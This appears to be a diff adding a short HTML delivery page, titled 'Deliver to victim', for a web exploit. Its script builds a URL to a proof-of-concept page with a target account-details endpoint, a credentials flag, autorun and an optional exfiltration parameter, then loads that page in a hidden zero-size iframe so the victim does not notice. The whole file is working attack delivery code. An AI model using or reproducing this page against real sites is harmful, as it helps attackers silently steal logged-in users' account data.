@@ -1,0 +1,18 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Deliver</title>
+<style>body{font:14px system-ui;margin:24px}.muted{color:#666}</style>
+<h1>Deliver to victim</h1>
+<p class="muted">This page silently loads the PoC below.</p>
+<script>
+  // Configure here or pass through query params:
+  const qs = new URLSearchParams(location.search);
+  const target = qs.get('target') || 'https://target.example.com/accountDetails';
+  const creds  = qs.get('creds')  || '1';
+  const autorun= '1';
+  const exfil  = qs.get('exfil')  || ''; // optional
+  const poc = new URL('./poc_api.html', location.href);
+  poc.search = new URLSearchParams({ target, creds, autorun, ...(exfil?{exfil}:{} ) }).toString();
+
+  document.write(`<iframe src="${poc}" style="display:block;width:0;height:0;border:0;visibility:hidden"></iframe>`);
+</script>
